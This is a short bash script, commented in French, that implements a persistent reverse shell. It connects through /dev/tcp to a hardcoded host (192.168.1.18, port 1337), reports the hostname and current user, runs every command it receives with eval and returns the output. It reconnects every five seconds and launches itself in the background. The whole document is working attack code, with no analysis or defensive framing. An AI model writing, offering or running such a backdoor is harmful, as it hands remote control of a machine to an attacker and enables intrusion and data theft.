#!/bin/bash

# Configuration
SERVER="192.168.1.18"
PORT=1337

# Identifie le système
OS="Linux"

# Fonction du reverse shell
function connect_back() {
    while true; do
        # Établit la connexion
        exec 5<>/dev/tcp/$SERVER/$PORT
        if [ $? -eq 0 ]; then
            echo "[$OS] Shell connecté depuis $(hostname) ($(whoami))" >&5
            while IFS= read -r cmd <&5; do
                if [[ "$cmd" == "exit" ]]; then
                    break
                fi
                output=$(eval "$cmd" 2>&1)
                echo -e "$output" >&5
            done
        fi
        sleep 5
    done
}

# Lancer en arrière-plan
connect_back &
